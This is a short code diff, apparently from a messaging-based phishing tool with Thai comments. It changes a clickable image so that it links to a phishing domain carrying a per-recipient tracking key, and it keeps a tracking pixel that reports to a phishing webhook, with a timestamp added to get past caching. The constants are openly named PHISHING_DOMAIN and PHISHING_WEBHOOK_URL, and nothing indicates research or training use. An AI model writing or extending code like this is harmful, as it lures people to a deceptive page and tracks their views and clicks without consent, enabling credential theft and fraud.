@@ -817,7 +817,8 @@
                 imageUrl = await uploadImage();
                 if (!imageUrl) return;
                 
-                // URL for the main image itself (obtained from ImgBB upload) is stored in the 'imageUrl' variable
+                // สร้าง URL สำหรับคลิก (ชี้ไปที่ index.html พร้อม tracking key)
+                const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`; // PHISHING_DOMAIN should point to index.html
                 // สร้าง URL สำหรับ Tracking Pixel (เมื่อแสดงผล Preview)
                 const pixelTrackUrl = `${PHISHING_WEBHOOK_URL}?action=pixelTrack&key=${encodeURIComponent(trackingKey)}&t=${Date.now()}`; // Add timestamp to try bypassing cache
 
@@ -833,9 +834,9 @@
                             size: 'full',
                             aspectRatio: '1:1',
                             aspectMode: 'cover',
-                            action: { // ทำให้รูปภาพคลิกได้ -> ลิงก์ไปยัง URL ของรูปภาพโดยตรง
+                            action: { // ทำให้รูปภาพคลิกได้ -> ลิงก์ไปยัง index.html พร้อม tracking key
                                 type: 'uri',
-                                uri: imageUrl // <-- CHANGED to link directly to the uploaded image URL
+                                uri: clickTrackUrl // <-- REVERTED to use tracking key URL pointing to index.html
                             }
                         },
                         footer: { // เพิ่ม Footer สำหรับใส่ Tracking Pixel
